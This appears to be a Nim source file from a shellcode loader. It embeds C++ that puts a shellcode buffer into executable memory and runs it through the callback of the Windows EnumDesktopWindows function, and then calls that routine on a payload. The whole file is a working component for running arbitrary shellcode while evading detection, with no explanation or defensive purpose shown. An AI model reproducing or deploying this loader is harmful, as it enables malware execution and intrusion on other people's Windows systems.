import public

{.emit: """

int EnumDesktopWindowsNim(char *shellcode,SIZE_T shellcodeSize) {
    LPVOID addr = ::VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    ::RtlMoveMemory(addr, shellcode, shellcodeSize);

    ::EnumDesktopWindows(::GetThreadDesktop(::GetCurrentThreadId()), (WNDENUMPROC)addr, NULL);
}
"""
.}

proc EnumDesktopWindowsNim(plainBuffer:cstring,size:cint):cint {.importcpp:"EnumDesktopWindowsNim(@)",nodecl.}

discard EnumDesktopWindowsNim(code,codelen)